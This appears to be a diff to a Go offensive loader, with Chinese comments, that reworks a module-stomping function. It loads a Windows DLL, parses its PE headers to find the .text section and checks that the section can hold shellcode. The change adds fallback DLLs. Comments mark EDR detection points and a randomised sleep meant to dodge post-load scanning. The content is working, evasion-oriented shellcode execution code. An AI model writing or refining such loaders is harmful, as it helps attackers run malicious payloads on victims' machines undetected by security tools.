@@ -76,9 +76,58 @@ func moduleStompExec(shellcode []byte) bool {
 		return false
 	}
 
-	dllName, _ := syscall.BytePtrFromString(stompDLL)
-	hModule, _, _ := syscall.Syscall(loadLib, 1, uintptr(unsafe.Pointer(dllName)), 0, 0)
-	if hModule == 0 {
+	// 候选 DLL 列表：主 DLL + 备选（.text 段通常 > 64KB）
+	// 如果主 DLL 加载失败或 .text 段太小，自动尝试下一个
+	candidates := []string{
+		stompDLL,
+		"dbghelp.dll",
+		"mswsock.dll",
+		"cryptsp.dll",
+		"wldap32.dll",
+	}
+
+	var hModule uintptr
+	var textAddr uintptr
+	var textSize uintptr
+
+	for _, dll := range candidates {
+		dllName, _ := syscall.BytePtrFromString(dll)
+		h, _, _ := syscall.Syscall(loadLib, 1, uintptr(unsafe.Pointer(dllName)), 0, 0)
+		if h == 0 {
+			continue
+		}
+
+		// 解析 PE 头定位 .text 段
+		dosH := (*IMAGE_DOS_HEADER)(unsafe.Pointer(h))
+		if dosH.Magic != 0x5A4D {
+			continue
+		}
+		ntH := (*IMAGE_NT_HEADERS)(unsafe.Pointer(h + uintptr(dosH.LfaNew)))
+		if ntH.Signature != 0x00004550 {
+			continue
+		}
+
+		secOff := uintptr(dosH.LfaNew) + 4 + 20 + uintptr(ntH.FileHeader.SizeOfOptionalHeader)
+		var tAddr, tSize uintptr
+		for j := uint16(0); j < ntH.FileHeader.NumberOfSections; j++ {
+			sh := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(h + secOff + uintptr(j)*40))
+			if string(sh.Name[:5]) == ".text" {
+				tAddr = h + uintptr(sh.VirtualAddress)
+				tSize = uintptr(sh.VirtualSize)
+				break
+			}
+		}
+
+		// 校验 .text 段能容纳 shellcode
+		if tAddr != 0 && tSize >= uintptr(len(shellcode)) {
+			hModule = h
+			textAddr = tAddr
+			textSize = tSize
+			break
+		}
+	}
+
+	if hModule == 0 || textAddr == 0 {
 		return false
 	}
 
@@ -86,38 +135,7 @@ func moduleStompExec(shellcode []byte) bool {
 	// 【检测点】部分 EDR 在 LoadLibrary 后短暂窗口内扫描新模块
 	time.Sleep(time.Duration(200+rand.Intn(500)) * time.Millisecond)
 
-	// ── 2. 解析 PE 头定位 .text 段 ──
-	// 复用 _structs.go.tmpl 中定义的 PE 结构体
-	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(hModule))
-	if dosHeader.Magic != 0x5A4D { // "MZ"
-		return false
-	}
-	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(hModule + uintptr(dosHeader.LfaNew)))
-	if ntHeaders.Signature != 0x00004550 { // "PE\0\0"
-		return false
-	}
-
-	// 遍历 section headers 查找 .text 段
-	sectionOffset := uintptr(dosHeader.LfaNew) + 4 + 20 + uintptr(ntHeaders.FileHeader.SizeOfOptionalHeader)
-	var textAddr uintptr
-	var textSize uintptr
-	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
-		sh := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(hModule + sectionOffset + uintptr(i)*40))
-		if string(sh.Name[:5]) == ".text" {
-			textAddr = hModule + uintptr(sh.VirtualAddress)
-			textSize = uintptr(sh.VirtualSize)
-			break
-		}
-	}
-	if textAddr == 0 || textSize == 0 {
-		return false
-	}
-
-	// ── 3. 校验 .text 段容量 ──
-	// 如果 shellcode 比 .text 段大，无法 stomp，回退到常规执行
-	if uintptr(len(shellcode)) > textSize {
-		return false
-	}
+	// ── 3. 校验 .text 段容量 ──（已在 DLL 选择循环中完成）
 
 	// ── 4. 修改 .text 段权限为 RW ──
 	// 【检测点】ETW TI: MEM_IMAGE 区域权限从 RX 变为 RW，这是 stomping 的核心特征
